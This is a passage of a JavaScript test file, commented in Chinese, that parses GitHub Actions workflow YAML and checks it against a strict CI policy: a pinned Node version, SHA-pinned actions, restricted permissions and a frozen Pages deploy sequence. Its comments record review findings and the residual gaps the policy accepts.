// CI 設定契約（Workstream E，2026-10-27；head 9 2026-10-28：以真實 YAML 1.2 解析器取代行級 lexer）：
// Node 釘住單一來源 + 明確 runner 標籤 + SHA 釘住 + 排程檢查器隔離 + 權限限制 + 無預期外的部署路徑。
//
// 架構（Owner 決定 2026-10-28，E1/E2）：
//   1. 「YAML 的意義」只由一個成熟解析器決定：`yaml`（eemeli/yaml 2.9.1，dev/test-only、精確釘版、lockfile integrity）。
//      本檔不再有任何自行推斷 YAML 語義的程式碼（沒有去註解、去引號、依縮排切塊、正規化文字的 lexer）。先前 8 個 head 的
//      行級稽核被合法 YAML 反覆繞過（引號鍵、`? key` 明示鍵、區塊純量冒充、尾註解、引號值內的 `#` ——Codex r8 F1），因為
//      它們在「解釋 YAML」；解析器錯誤 / 警告 → fail closed。
//   2. 「哪些意義 / 形狀被允許」仍由本 repo 的稽核決定（canonical workflow policy）：解析器接受更多 YAML 語法，不等於稽核
//      放寬。凡是合法 YAML 但不在 canonical 形狀內（anchor / alias / tag / 明示鍵 / 引號鍵 / flow mapping / 多文件 / 文件標記 /
//      非 run 的區塊純量 / 非小寫識別字的鍵 / 預期外的鍵 ……）一律 RED，訊息固定帶 `valid YAML, rejected by AI Arena canonical
//      workflow policy`，以區別於解析錯誤（`[yaml parse error]`）。
//   3. 兩種視角、一個解析器：語義稽核走解析後的 Document AST；形狀政策另外讀同一解析器附在節點上的來源 token
//      （`keepSourceTokens`：`? key` 明示鍵指示符、純量 / 集合的書寫風格）。沒有第二個獨立的語義解析器可以彼此矛盾。
//   4. 原始文字檢查只剩「無法從解析結果表達、且有明文 canonical-source 需求」的三項（auditSourceText）：UTF-8 無 BOM、LF 行尾
//      且以單一換行結尾、Node patch 字面不得出現在 workflow 文字任何地方（含註解；單一來源 = `.node-version`）。`.node-version`
//      本身不是 YAML，auditNodeVersionFile 檢查其精確位元組。
//
// 契約（每條皆有 known-bad 臂，且臂呼叫的是生產稽核函式本身）：
//   CI-0 兩個 workflow 檔：恰一個 YAML 文件、零解析錯誤 / 警告、形狀政策全過（見 auditWorkflowYaml）。
//   CI-1 .node-version 為精確 X.Y.Z 且主版本 == APPROVED_MAJOR（22）。刻意升主版本線必須有意識地改這個常數。
//   CI-2 pages.yml 語義：根鍵 / 觸發 / 權限 / concurrency / jobs 的封閉形狀；validate、browser-smoke、deploy 三個 job（順序固定）；
//        每個 job 恰一個 setup-node（步驟鍵 ⊆ {name, uses, with}；with 鍵 ⊆ {node-version-file, cache}；node-version-file 的
//        **解析後字串** 必須恰等於 `.node-version`），且在該 job 第一個 run 步驟之前；全檔無 node-version / check-latest 鍵；
//        部署 action 只能出現在 deploy job；deploy 的 if / needs / permissions / environment 固定；workflow 權限 contents: read；
//        封閉 action 集合；canonical 前奏 checkout（只有 name+uses）→ setup-node；checkout 只能是第 1 步（較後的 checkout 可換掉工作區）；
//        deploy 的步驟序列（action / run 指令 / upload path）== DEPLOY_SHAPE（發佈路徑凍結）。
//   任何稽核內部例外 → `[audit internal error — fail closed]` problem（guarded()），不讓測試程序崩潰但仍 RED。
//
// head 8 最終輪發現在本架構下的處置（審查紀錄，Codex head-10 F3）：
//   Codex r8 F1（引號值內的 `#`）→ 已由解析器架構修正（CI-6a）。
//   Codex r8 F2（較後 run 步驟 `if: always()`）→ rejected-with-reason：setup-node 不得帶 if / continue-on-error（白名單），其失敗即 job 失敗，
//     不存在「check 綠卻以映像 Node 執行」的路徑；且屬 W-1（惡意 workflow 作者）類別。稽核只要求 `if` 是表達式字串，不解讀其內容。
//   Codex r8 F3 / Grok r8 F2（job 層 `if: false`、測試步驟 `if`/`continue-on-error`）→ W-1 類別處置不變：PR 本可改寫自身的閘；job 層 `if`
//     與裸布林 `if` 現被封閉形狀附帶擋下，表達式 `if: ${{ false }}` 與 run 步驟的 `continue-on-error` 在 validate/browser-smoke 仍 GREEN（殘餘）。
//   Grok r8 F1（setup-node 前的 github-script / checkout repository / 後續 PATH 改寫）→ W-1 類別處置不變；action 形式被 canonical 前奏 +
//     封閉 action 集合 + checkout-only-step-1 附帶擋下，run 本文改 `$GITHUB_PATH` 仍 GREEN（殘餘）。
//   Grok r8 F3（deploy `if` 未排除 pull_request_target）→ main 既有且本 PR 未改；封閉觸發集合使 pull_request_target 無法再加入。
//   CI-3 每個 runs-on 都是明確的 ubuntu-26.04；任何解析後字串都不得含 ubuntu-latest。
//   CI-4 每個 uses 都是 GitHub-owned、40-hex SHA 釘住、並帶 `# vX.Y.Z` 釋出註解（註解由解析器提供：Scalar.comment）。
//   CI-5 node-pin-check.yml 隔離：只有 schedule + workflow_dispatch；permissions 恰為 contents: read 且無 job 層 permissions；
//        無任何 write；無 secrets / GITHUB_TOKEN；無 Pages / deploy action；單一 job；步驟形狀固定（checkout → setup-node →
//        `node scripts/check-node-pin.mjs`）；timeout-minutes；禁 shell/env/container/services/environment/defaults/strategy/outputs。
//   CI-5b node-pin-check.yml canonical form（解析後結構，SHA / 版本註解 / cron 以 placeholder 取代）== 凍結模板（含鍵序）；
//        cron 必須是真的會觸發的每週 "M H * * D"。
//   CI-6 known-bad 臂（a–j），含 Codex r8 F1 的 `".node-version # x"`。
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { parseAllDocuments, isAlias, isMap, isPair, isScalar, isSeq, visit, LineCounter } from 'yaml';

const ROOT = new URL('../', import.meta.url);
const PAGES = readFileSync(new URL('.github/workflows/pages.yml', ROOT), 'utf8');
const PIN_CHECK = readFileSync(new URL('.github/workflows/node-pin-check.yml', ROOT), 'utf8');
const NODE_VERSION_FILE = readFileSync(new URL('.node-version', ROOT), 'utf8');

export const APPROVED_MAJOR = 22; // Owner-approved CI line (2026-10-27). Changing it is a conscious decision, not maintenance.
export const POLICY = 'valid YAML, rejected by AI Arena canonical workflow policy';
const RUNNER_LABEL = 'ubuntu-26.04';
const PIN_CHECK_RUN = 'node scripts/check-node-pin.mjs';
const KEY_RE = /^[a-z_][a-z0-9_-]*$/; // 鍵一律是小寫識別字（GitHub 的 with 輸入名不分大小寫 → 大小寫變體視為同一輸入，直接拒絕）
const USES_RE = /^actions\/[A-Za-z0-9_.-]+@[0-9a-f]{40}$/;
const VERSION_COMMENT_RE = /^\s*v\d+\.\d+\.\d+\s*$/;
const DEPLOY_ACTIONS = ['actions/configure-pages', 'actions/upload-pages-artifact', 'actions/deploy-pages'];
// 封閉的 action 集合（canonical policy）：workflow 只能使用這些 GitHub-owned action；新增 action 是有意識的契約變更，不是維護。
const PAGES_ALLOWED_ACTIONS = ['actions/checkout', 'actions/setup-node', ...DEPLOY_ACTIONS];
const PIN_CHECK_ALLOWED_ACTIONS = ['actions/checkout', 'actions/setup-node'];
const SETUP_NODE_ALLOWED_STEP_KEYS = ['name', 'uses', 'with'];   // Grok r7 F2：if / continue-on-error / env / timeout-minutes 可讓釘住的 Node 實際未生效
const SETUP_NODE_ALLOWED_WITH = ['node-version-file', 'cache'];  // Grok R3 F2/F4：mirror / mirror-token / registry-url / check-latest 不在契約內
const STEP_KEYS = ['name', 'id', 'if', 'uses', 'with', 'run', 'continue-on-error'];
const JOB_KEYS = { validate: ['runs-on', 'steps'], 'browser-smoke': ['runs-on', 'steps'], deploy: ['if', 'needs', 'runs-on', 'permissions', 'environment', 'steps'] };
// deploy job 的 canonical 步驟（發佈路徟；Codex head-9 F2 之後釘死，Codex head-10 F1 之後補全）：每一步**除 `name` 外的所有鍵**都凍結——
// action 名（SHA 由 CI-4 另管）、run 指令、`if`、`continue-on-error`、`id`、全部 `with` 輸入值。只凍結序列而放任步驟控制鍵，等於允許
// 「組裝器 continue-on-error + 上傳 if: always()」把 fail-closed 的發佈路徑變成 fail-open。改動發佈路徑 = 有意識的契約變更，必須同時改這裡。
const DEPLOY_SHAPE = [
  { uses: 'actions/checkout' },
  { uses: 'actions/setup-node', with: { 'node-version-file': '.node-version' } },
  { uses: 'actions/configure-pages' },
  { run: 'node scripts/build-manifest.mjs --strict' },
  { run: 'node scripts/assemble-site.mjs' },
  { uses: 'actions/upload-pages-artifact', with: { name: 'github-pages-${{ github.run_attempt }}', path: '_site' } },
  { id: 'deployment', uses: 'actions/deploy-pages', 'continue-on-error': true, with: { artifact_name: 'github-pages-${{ github.run_attempt }}', timeout: 600000 } },
  { if: "steps.deployment.outcome == 'failure'", run: 'sleep 30' },
  { id: 'deployment_retry', if: "steps.deployment.outcome == 'failure'", uses: 'actions/deploy-pages', with: { artifact_name: 'github-pages-${{ github.run_attempt }}', timeout: 600000 } },
];
const PIN_CHECK_FORBIDDEN_KEYS = ['shell', 'env', 'container', 'services', 'environment', 'defaults', 'strategy', 'outputs', 'secrets', 'concurrency', 'needs'];

// ── 解析（唯一的 YAML 語義來源）────────────────────────────────────────────
const YAML_OPTIONS = { version: '1.2', schema: 'core', merge: false, uniqueKeys: true, keepSourceTokens: true, strict: true, prettyErrors: true };
const firstLine = (s) => String(s).split('\n')[0];

// 回傳 { doc, lineCounter, problems }。doc === null ⇒ 無法安全地做語義稽核（文件數 ≠ 1 或解析錯誤；problems 已說明）。
// 解析警告（例如未解析的 tag）也列為 problem（fail closed），但 doc 仍回傳以便語義稽核把其餘問題一併列出。
export function parseWorkflow(text) {
  const lineCounter = new LineCounter();
  const problems = [];
  const docs = parseAllDocuments(text, { ...YAML_OPTIONS, lineCounter });
  if (docs.length !== 1) {
    problems.push(docs.length === 0 ? '[yaml parse error] no YAML document (empty file)' : `${docs.length} YAML documents in one file — ${POLICY} (exactly one document)`);
    return { doc: null, lineCounter, problems };
  }
  const doc = docs[0];
  for (const e of doc.errors) problems.push(`[yaml parse error] ${e.code}: ${firstLine(e.message)}`);
  for (const w of doc.warnings) problems.push(`[yaml parse warning, fail closed] ${w.code}: ${firstLine(w.message)}`);
  if (doc.errors.length) return { doc: null, lineCounter, problems };
  if (doc.directives.docStart === true) problems.push(`document start marker "---" — ${POLICY}`);
  if (doc.directives.docEnd) problems.push(`document end marker "..." — ${POLICY}`);
  if (doc.directives.yaml.explicit) problems.push(`%YAML directive — ${POLICY}`);
  if (Object.keys(doc.directives.tags).some((h) => h !== '!!' && h !== '!')) problems.push(`%TAG directive — ${POLICY}`);
  problems.push(...auditNodeStyle(doc, lineCounter, text));
  return { doc, lineCounter, problems };
}

const lineOf = (lc, node) => { const r = node?.range ?? node?.key?.range; return r ? `line ${lc.linePos(r[0]).line}` : 'unknown line'; };

// 形狀政策（canonical source policy）：走訪解析器產生的每個節點。這裡不解釋 YAML——只讀解析器已決定的節點型別 / 風格 /
// 來源 token / 來源範圍（node.range；多行引號純量會被解析器依規範摺疊成單行值，所以「是否跨行」看來源範圍而非值）。
function auditNodeStyle(doc, lc, text) {
  const problems = [];
  const bad = (node, what) => problems.push(`${what} (${lineOf(lc, node)}) — ${POLICY}`);
  if (!isMap(doc.contents)) { problems.push(`root is not a block mapping — ${POLICY}`); return problems; }
  visit(doc, (_, node) => {
    if (node === null || node === undefined) return; // `? key` 無值的 pair 其 value 為 null（Codex head-9 F1：先前在此對 null 取屬性而崩潰）
    if (isAlias(node)) { bad(node, `alias "*${node.source}"`); return; }
    if (isPair(node)) {
      if ((node.srcToken?.start ?? []).some((t) => t.type === 'explicit-key-ind')) bad(node, 'explicit key ("? key")');
      if (node.value === null || node.value === undefined) bad(node, 'mapping entry without a value node');
      const k = node.key;
      if (!isScalar(k)) bad(node, 'non-scalar mapping key');
      else if (k.type !== 'PLAIN') bad(node, `quoted key ${JSON.stringify(String(k.value))}`);
      else if (typeof k.value !== 'string' || !KEY_RE.test(k.value)) bad(node, `key ${JSON.stringify(k.value)} is not a plain lowercase identifier`);
      const keyName = isScalar(k) ? String(k.value) : '';
      const v = node.value;
      if (isScalar(v) && keyName !== 'run') {
        if (v.type === 'BLOCK_LITERAL' || v.type === 'BLOCK_FOLDED') bad(v, `block scalar ("|" / ">") under key "${keyName}" (only "run" may use one)`);
        else if ((v.range && text.slice(v.range[0], v.range[1]).includes('\n')) || (typeof v.value === 'string' && v.value.includes('\n'))) bad(v, `multi-line scalar under key "${keyName}" (only "run" may span lines)`);
      }
      return;
    }
    if (node.anchor) bad(node, `anchor "&${node.anchor}"`);
    if (node.tag) bad(node, `explicit tag "${node.tag}"`);
    if (isMap(node) && node.flow) bad(node, 'flow-style mapping "{…}"');
    if (isSeq(node) && node.flow && node.items.some((i) => !isScalar(i))) bad(node, 'flow-style sequence with non-scalar items');
    if (isSeq(node) && !node.flow && node.items.some((i) => !isMap(i))) bad(node, 'block sequence item is not a mapping (plain scalar / nested sequence)');
  });
  return problems;
}

// 任何稽核內部的例外都轉成 problem（fail closed 且可讀），而不是讓測試程序崩潰（Codex head-9 F1 / R11）。
// 崩潰與回報都讓 CI 變紅；差別在於 known-bad 臂與操作者能看到「哪一條規則」而非一個 TypeError。
function guarded(fn) {
  return (text) => {
    try { return fn(text); } catch (e) { return [`[audit internal error — fail closed] ${e?.constructor?.name ?? 'Error'}: ${firstLine(e?.message ?? e)}`]; }
  };
}

// CI-0：解析 + 形狀政策（不含語義）。
export const auditWorkflowYaml = guarded((text) => parseWorkflow(text).problems);

// ── AST 存取（防禦式：任何型別不符都回 undefined，由呼叫端轉成 problem）────────
const keyOf = (pair) => (isScalar(pair.key) ? String(pair.key.value) : undefined);
const keysOf = (map) => (isMap(map) ? map.items.map(keyOf) : []);
const getIn = (map, key) => (isMap(map) ? map.items.find((p) => keyOf(p) === key)?.value : undefined);
const strOf = (node) => (isScalar(node) && typeof node.value === 'string' ? node.value : undefined);
const isNullScalar = (node) => isScalar(node) && node.value === null;
const show = (node) => (isScalar(node) ? JSON.stringify(node.value) : isMap(node) ? '{…}' : isSeq(node) ? '[…]' : String(node));

function expectKeys(problems, map, label, allowed, { exact = true, ordered = false } = {}) {
  if (!isMap(map)) { problems.push(`${label} must be a block mapping, got ${show(map)}`); return false; }
  const ks = keysOf(map);
  const extra = ks.filter((k) => !allowed.includes(k));
  if (extra.length) problems.push(`${label} carries keys outside {${allowed.join(', ')}}: ${extra.join(', ')} — ${POLICY}`);
  if (exact) for (const k of allowed) if (!ks.includes(k)) problems.push(`${label} lacks required key "${k}"`);
  if (ordered && !extra.length && ks.length === allowed.length && ks.some((k, i) => k !== allowed[i])) problems.push(`${label} keys must be in the canonical order ${allowed.join(' → ')}, got ${ks.join(' → ')} — ${POLICY}`);
  return !extra.length;
}
function expectString(problems, node, label, exactValue) {
  const s = strOf(node);
  if (s === undefined) { problems.push(`${label} must be a string, got ${show(node)}`); return undefined; }
  if (exactValue !== undefined && s !== exactValue) problems.push(`${label} must be exactly ${JSON.stringify(exactValue)}, got ${JSON.stringify(s)}`);
  return s;
}
function expectExactMap(problems, node, label, expected) { // expected: { key: scalar }，鍵集合精確、值精確
  if (!expectKeys(problems, node, label, Object.keys(expected))) return;
  for (const [k, v] of Object.entries(expected)) {
    const n = getIn(node, k);
    if (n === undefined) continue;
    if (v === null) { if (!isNullScalar(n)) problems.push(`${label}.${k} must be empty, got ${show(n)}`); }
    else if (!isScalar(n) || n.value !== v) problems.push(`${label}.${k} must be exactly ${JSON.stringify(v)}, got ${show(n)}`);
  }
}

// 全檔走訪：所有解析後的鍵 / 字串純量（語義稽核用；形狀政策已在 parseWorkflow 內走訪過一次）
function allPairs(doc) { const out = []; visit(doc, (_, n) => { if (isPair(n)) out.push(n); }); return out; }
function allStrings(doc) { const out = []; visit(doc, (_, n) => { if (isScalar(n) && typeof n.value === 'string') out.push(n); }); return out; }

// ── 語義稽核：共用規則 ─────────────────────────────────────────────────────
const usesOf = (step) => strOf(getIn(step, 'uses'));
const isSetupNodeStep = (step) => /^actions\/setup-node@/.test(usesOf(step) ?? '');
const actionName = (uses) => uses.split('@')[0];

export function auditNodeVersionFile(text) {
  const problems = [];
  const v = text.trim();
  if (!/^\d+\.\d+\.\d+$/.test(v)) problems.push(`.node-version must be an exact X.Y.Z (no ranges, aliases or v-prefix), got: "${v}"`);
  else if (Number(v.split('.')[0]) !== APPROVED_MAJOR) problems.push(`.node-version major ${v.split('.')[0]} != approved ${APPROVED_MAJOR} (moving major lines is an Owner decision — update APPROVED_MAJOR consciously)`);
  if (text !== `${v}\n`) problems.push('.node-version must be exactly the version plus one trailing newline');
  return problems;
}

// 原始文字 canonical-source 需求（唯一允許的 raw-text 檢查；理由見檔頭 4.）
export function auditSourceText(text, { pinnedLiteral } = {}) {
  const problems = [];
  if (text.startsWith('\uFEFF')) problems.push('file must not start with a UTF-8 BOM (canonical source requirement)');
  if (text.includes('\r')) problems.push('file must use LF line endings only (canonical source requirement)');
  if (!text.endsWith('\n') || text.endsWith('\n\n')) problems.push('file must end with exactly one trailing newline (canonical source requirement)');
  if (pinnedLiteral && text.includes(pinnedLiteral)) problems.push(`the Node patch literal "${pinnedLiteral}" must not appear anywhere in the workflow text, comments included (single source = .node-version)`);
  return problems;
}

// 一個 `uses:` 值節點的釘住檢查（CI-4）：GitHub-owned、40-hex SHA、同一行的 `# vX.Y.Z` 註解（註解由解析器附在 Scalar.comment）。
export function usesProblems(node, where, lc) {
  const problems = [];
  const uses = expectString(problems, node, `${where} uses`);
  if (uses === undefined) return problems;
  if (!/^[^@\s]+@[0-9a-f]{40}$/.test(uses)) problems.push(`${where} uses not pinned to a 40-hex commit SHA: ${uses}`);
  if (!/^actions\//.test(uses)) problems.push(`${where} uses is not a GitHub-owned action (repo policy = GitHub-owned only): ${uses}`);
  else if (!USES_RE.test(uses)) problems.push(`${where} uses has an unexpected shape: ${uses}`);
  if (!VERSION_COMMENT_RE.test(node.comment ?? '')) problems.push(`${where} uses lacks the "# vX.Y.Z" release comment on the same line: ${uses} (${lineOf(lc, node)})`);
  return problems;
}
function auditUses(problems, step, where, lc) {
  const node = getIn(step, 'uses');
  if (node !== undefined) problems.push(...usesProblems(node, where, lc));
}

// 一個 job 的步驟稽核：步驟形狀、uses 釘住、封閉 action 集合、setup-node 契約、canonical 前奏（checkout → setup-node）、順序、
// 部署路徑。回傳 setup-node 步驟數。
function auditSteps(problems, steps, job, lc, { allowDeployActions, allowedActions }) {
  if (!isSeq(steps) || steps.flow) { problems.push(`job "${job}" steps must be a block sequence, got ${show(steps)}`); return 0; }
  let setupCount = 0; let firstRun = -1; let setupIndex = -1;
  // canonical 前奏：第 1 步是「本 repo 的單純 checkout」（只有 name + uses，無 with: → 不能換 repository / ref / path），第 2 步就是
  // setup-node。任何在 setup-node 之前的其他 action / run（例如改寫 .node-version 的 github-script）都在形狀之外 → RED。
  const [first, second] = steps.items;
  if (!isMap(first) || actionName(usesOf(first) ?? '') !== 'actions/checkout' || keysOf(first).some((k) => !['name', 'uses'].includes(k))) problems.push(`job "${job}" step #1 must be the plain repository checkout (actions/checkout with only name + uses; no with:/repository/ref override) — ${POLICY}`);
  if (!isMap(second) || !isSetupNodeStep(second)) problems.push(`job "${job}" step #2 must be the setup-node step (canonical prologue checkout → setup-node before any other action or run step) — ${POLICY}`);
  // checkout 只能出現一次、且只能是第 1 步（Codex head-9 F2）：任何較後的 checkout（可帶 `repository:`/`ref:`）會換掉工作區——validate
  // 的閘會對另一棵樹跑、deploy 的組裝器會發佈另一棵樹。
  steps.items.forEach((s, i) => { if (i > 0 && isMap(s) && actionName(usesOf(s) ?? '') === 'actions/checkout') problems.push(`job "${job}" step #${i + 1}: actions/checkout may only appear as step #1 (a later checkout can replace the workspace that the gates / the assembler operate on) — ${POLICY}`); });
  steps.items.forEach((step, i) => {
    const where = `job "${job}" step #${i + 1}`;
    if (!isMap(step)) { problems.push(`${where} must be a block mapping, got ${show(step)}`); return; }
    expectKeys(problems, step, where, STEP_KEYS, { exact: false }); // 多餘鍵已記錄；仍繼續稽核該步驟（setup-node 計數與契約不因此失真）
    const hasUses = getIn(step, 'uses') !== undefined; const hasRun = getIn(step, 'run') !== undefined;
    if (hasUses === hasRun) problems.push(`${where} must have exactly one of uses / run`);
    if (getIn(step, 'name') !== undefined) expectString(problems, getIn(step, 'name'), `${where} name`);
    if (getIn(step, 'id') !== undefined && !KEY_RE.test(strOf(getIn(step, 'id')) ?? '')) problems.push(`${where} id must be a lowercase identifier string`);
    if (getIn(step, 'if') !== undefined) expectString(problems, getIn(step, 'if'), `${where} if (must be an expression string, never a bare boolean)`);
    if (getIn(step, 'continue-on-error') !== undefined && typeof getIn(step, 'continue-on-error')?.value !== 'boolean') problems.push(`${where} continue-on-error must be a boolean`);
    if (hasRun) { expectString(problems, getIn(step, 'run'), `${where} run`); if (firstRun < 0) firstRun = i; }
    const w = getIn(step, 'with');
    if (w !== undefined) {
      if (!isMap(w) || w.flow) problems.push(`${where} with: must be a block mapping, got ${show(w)}`);
      else for (const p of w.items) if (!isScalar(p.value) || p.value.value === null) problems.push(`${where} with.${keyOf(p)} must be a scalar value, got ${show(p.value)}`);
    }
    auditUses(problems, step, where, lc);
    const uses = usesOf(step);
    if (uses && !allowedActions.includes(actionName(uses))) problems.push(`${where} uses an action outside the closed set {${allowedActions.join(', ')}}: ${actionName(uses)} — ${POLICY}`);
    if (uses && DEPLOY_ACTIONS.includes(actionName(uses)) && !allowDeployActions) problems.push(`${where} uses a Pages/deploy action (${actionName(uses)}) outside the deploy job — unexpected deploy path`);
    if (isSetupNodeStep(step)) {
      setupCount += 1; if (setupIndex < 0) setupIndex = i;
      const extra = keysOf(step).filter((k) => !SETUP_NODE_ALLOWED_STEP_KEYS.includes(k));
      if (extra.length) problems.push(`${where} (setup-node) carries keys outside {${SETUP_NODE_ALLOWED_STEP_KEYS.join(', ')}} (if / continue-on-error / env / … can skip or neuter the pin): ${extra.join(', ')}`);
      if (w === undefined) problems.push(`${where} (setup-node) has no with: block (node-version-file must be passed under with:)`);
      else if (isMap(w) && !w.flow) {
        for (const k of keysOf(w)) {
          if (k === 'node-version') problems.push(`${where} (setup-node) with: still carries a node-version key (second source of truth; setup-node prefers it over the file)`);
          else if (k === 'check-latest') problems.push(`${where} (setup-node) with: sets check-latest (any value; the reproducibility contract forbids the key)`);
          else if (!SETUP_NODE_ALLOWED_WITH.includes(k)) problems.push(`${where} (setup-node) with-key not allowlisted (${SETUP_NODE_ALLOWED_WITH.join(', ')}): "${k}"`);
        }
        const nvf = getIn(w, 'node-version-file');
        if (nvf === undefined) problems.push(`${where} (setup-node) with: block does not consume node-version-file: .node-version`);
        else if (strOf(nvf) !== '.node-version') problems.push(`${where} (setup-node) node-version-file must be exactly the string ".node-version" (parsed value: ${show(nvf)}) — setup-node would read a different file`);
        const cache = getIn(w, 'cache');
        if (cache !== undefined && strOf(cache) !== 'npm') problems.push(`${where} (setup-node) cache must be exactly "npm" when present, got ${show(cache)}`);
      }
    }
  });
  if (setupCount !== 1) problems.push(`job "${job}" must have exactly one setup-node step consuming .node-version, found ${setupCount}`);
  if (setupIndex >= 0 && firstRun >= 0 && firstRun < setupIndex) problems.push(`job "${job}": a run: step precedes the setup-node step (it would execute on the image's default Node, not .node-version)`);
  return setupCount;
}

function auditGlobalKeys(problems, doc, lc) {
  for (const p of allPairs(doc)) {
    const k = keyOf(p);
    if (k === 'node-version') problems.push(`workflow contains a node-version key somewhere (${lineOf(lc, p)})`);
    if (k === 'check-latest') problems.push(`workflow contains a check-latest key somewhere (${lineOf(lc, p)})`);
  }
  for (const s of allStrings(doc)) if (s.value.includes('ubuntu-latest')) problems.push(`a parsed value references the rolling alias ubuntu-latest (${lineOf(lc, s)}): ${JSON.stringify(s.value)}`);
}

export function jobNames(text) { const { doc } = parseWorkflow(text); return doc ? keysOf(getIn(doc.contents, 'jobs')) : []; }

// deploy job：每一步（去 `name`、`uses` 只留 action 名）的解析結果必須與 DEPLOY_SHAPE 對應項**完全相等**（鍵集合與值；鍵序不計）。
const sortKeys = (v) => (Array.isArray(v) ? v.map(sortKeys) : v && typeof v === 'object' ? Object.fromEntries(Object.keys(v).sort().map((k) => [k, sortKeys(v[k])])) : v);
function canonicalStep(step) {
  if (!isMap(step)) return null;
  const js = toCanonical(step); // 同一個 AST→JS 轉換（CI-5b 也用它）；YAMLMap.toJS() 需要 Document 參數，這裡不需要
  if (js && typeof js === 'object') { delete js.name; if (typeof js.uses === 'string') js.uses = actionName(js.uses); }
  return js;
}
function auditDeployShape(problems, steps) {
  if (!isSeq(steps) || steps.flow) return; // 已由 auditSteps 回報
  const label = (e) => (e.uses ? `uses:${e.uses}` : `run:${JSON.stringify(e.run)}`);
  if (steps.items.length !== DEPLOY_SHAPE.length) {
    problems.push(`job "deploy" must have exactly ${DEPLOY_SHAPE.length} steps [${DEPLOY_SHAPE.map(label).join(' → ')}], got ${steps.items.length} — ${POLICY}`);
    return;
  }
  DEPLOY_SHAPE.forEach((e, i) => {
    const got = JSON.stringify(sortKeys(canonicalStep(steps.items[i])));
    const want = JSON.stringify(sortKeys(e));
    if (got !== want) problems.push(`job "deploy" step #${i + 1} must be exactly the canonical publication step ${want} (every key except name is frozen: action, run, if, continue-on-error, id, with), got ${got} — ${POLICY}`);
  });
}

// ── pages.yml ──────────────────────────────────────────────────────────────
export const auditPagesWorkflow = guarded(auditPagesWorkflowUnguarded);
function auditPagesWorkflowUnguarded(text) {
  const { doc, lineCounter: lc, problems } = parseWorkflow(text);
  if (!doc) return problems;
  const root = doc.contents;
  expectKeys(problems, root, 'workflow', ['name', 'on', 'permissions', 'concurrency', 'jobs']);
  expectString(problems, getIn(root, 'name'), 'workflow name');
  const on = getIn(root, 'on');
  if (expectKeys(problems, on, 'on', ['push', 'pull_request', 'workflow_dispatch'])) {
    for (const trig of ['push', 'pull_request']) {
      const t = getIn(on, trig);
      if (expectKeys(problems, t, `on.${trig}`, ['branches'])) {
        const b = getIn(t, 'branches');
        if (!isSeq(b) || b.items.length !== 1 || strOf(b.items[0]) !== 'main') problems.push(`on.${trig}.branches must be exactly ["main"], got ${show(b)}`);
      }
    }
    if (!isNullScalar(getIn(on, 'workflow_dispatch'))) problems.push('on.workflow_dispatch must be empty');
  }
  expectExactMap(problems, getIn(root, 'permissions'), 'workflow permissions', { contents: 'read' });
  const conc = getIn(root, 'concurrency');
  if (expectKeys(problems, conc, 'concurrency', ['group', 'cancel-in-progress'])) {
    expectString(problems, getIn(conc, 'group'), 'concurrency.group');
    if (typeof getIn(conc, 'cancel-in-progress')?.value !== 'boolean') problems.push('concurrency.cancel-in-progress must be a boolean');
  }
  const jobs = getIn(root, 'jobs');
  if (expectKeys(problems, jobs, 'jobs', ['validate', 'browser-smoke', 'deploy'], { ordered: true })) {
    for (const p of jobs.items) {
      const job = keyOf(p); const j = p.value;
      if (!expectKeys(problems, j, `job "${job}"`, JOB_KEYS[job])) continue;
      expectString(problems, getIn(j, 'runs-on'), `job "${job}" runs-on`, RUNNER_LABEL);
      if (job === 'deploy') {
        expectString(problems, getIn(j, 'if'), 'job "deploy" if', "github.event_name != 'pull_request'");
        expectString(problems, getIn(j, 'needs'), 'job "deploy" needs', 'validate');
        expectExactMap(problems, getIn(j, 'permissions'), 'job "deploy" permissions', { contents: 'read', pages: 'write', 'id-token': 'write' });
        const env = getIn(j, 'environment');
        if (expectKeys(problems, env, 'job "deploy" environment', ['name', 'url'])) {
          expectString(problems, getIn(env, 'name'), 'job "deploy" environment.name', 'github-pages');
          expectString(problems, getIn(env, 'url'), 'job "deploy" environment.url');
        }
      }
      auditSteps(problems, getIn(j, 'steps'), job, lc, { allowDeployActions: job === 'deploy', allowedActions: PAGES_ALLOWED_ACTIONS });
      if (job === 'deploy') auditDeployShape(problems, getIn(j, 'steps'));
    }
  } else if (isMap(jobs)) {
    for (const p of jobs.items) if (isMap(p.value)) auditSteps(problems, getIn(p.value, 'steps'), keyOf(p), lc, { allowDeployActions: false, allowedActions: PAGES_ALLOWED_ACTIONS });
  }
  auditGlobalKeys(problems, doc, lc);
  return problems;
}

// ── node-pin-check.yml ─────────────────────────────────────────────────────
const WEEKLY_CRON_RE = /^(\d{1,2}) (\d{1,2}) \* \* ([0-6])$/;
const isFiringWeeklyCron = (c) => { const f = typeof c === 'string' && c.match(WEEKLY_CRON_RE); return Boolean(f) && Number(f[1]) <= 59 && Number(f[2]) <= 23; };

export const auditPinCheckWorkflow = guarded(auditPinCheckWorkflowUnguarded);
function auditPinCheckWorkflowUnguarded(text) {
  const { doc, lineCounter: lc, problems } = parseWorkflow(text);
  if (!doc) return problems;
  const root = doc.contents;
  expectKeys(problems, root, 'pin-check workflow', ['name', 'on', 'permissions', 'jobs'], { ordered: true });
  expectString(problems, getIn(root, 'name'), 'pin-check name');
  const on = getIn(root, 'on');
  if (expectKeys(problems, on, 'pin-check on (must only be triggered by schedule/workflow_dispatch)', ['schedule', 'workflow_dispatch'])) {
    const sched = getIn(on, 'schedule');
    if (!isSeq(sched) || sched.flow || sched.items.length !== 1) problems.push(`pin-check must declare exactly one cron, found ${isSeq(sched) ? sched.items.length : show(sched)}`);
    else if (expectKeys(problems, sched.items[0], 'pin-check schedule entry', ['cron'])) {
      const c = strOf(getIn(sched.items[0], 'cron'));
      if (!isFiringWeeklyCron(c)) problems.push(`pin-check cron must be a weekly "M H * * D" expression that actually fires (minute 0-59, hour 0-23, day-of-week 0-6), got: ${show(getIn(sched.items[0], 'cron'))}`);
    }
    if (!isNullScalar(getIn(on, 'workflow_dispatch'))) problems.push('pin-check on.workflow_dispatch must be empty (manual re-run after the 60-day schedule disablement)');
  }
  expectExactMap(problems, getIn(root, 'permissions'), 'pin-check permissions (must be exactly contents: read)', { contents: 'read' });
  const jobs = getIn(root, 'jobs');
  if (expectKeys(problems, jobs, 'pin-check jobs (exactly one job)', ['check'])) {
    const j = getIn(jobs, 'check');
    if (expectKeys(problems, j, 'pin-check job "check"', ['runs-on', 'timeout-minutes', 'steps'])) {
      expectString(problems, getIn(j, 'runs-on'), 'pin-check runs-on', RUNNER_LABEL);
